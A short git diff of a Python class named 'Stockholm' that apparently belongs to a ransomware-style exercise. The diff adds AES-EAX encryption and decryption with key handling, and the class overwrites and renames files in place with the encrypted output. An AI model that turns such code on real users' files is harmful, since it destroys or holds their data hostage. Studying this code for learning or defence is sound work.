@@ -23,23 +23,26 @@ def error_continue(msg):
 class Stockholm:
 	def __init__(self, key):
 		if key:
-			self.key = key
-		else
+			self.key = bytes.fromhex(key)
+		else:
 			self.key = os.urandom(32)
 
 	def decrypt(self, contents):
 		try:
-			return contents
+			nonce = contents[:16]
+			tag = contents[16:32]
+			ciphertext = contents[32:]
+			cipher = AES.new(self.key, AES.MODE_EAX, nonce)
+			data = cipher.decrypt_and_verify(ciphertext, tag)
+			return data
 		except Exception as e:
 			error_exit(e)
-		return contents
 
 	def encrypt(self, contents):
 		try:
 			cipher = AES.new(self.key, AES.MODE_EAX)
 			ciphertext, tag = cipher.encrypt_and_digest(contents)
-			# print(bytes.hex(ciphertext))
-			return ciphertext
+			return cipher.nonce + tag + ciphertext
 		except Exception as e:
 			error_exit(e)
 
@@ -56,7 +59,7 @@ class Stockholm:
 				os.rename(file, new_filename)
 				f.truncate(0)
 				f.seek(0)
-				f.write(contents)
+				f.write(result)
 			if Flags.reverse:
 				print(f"decrypted: {new_filename}")
 			else:
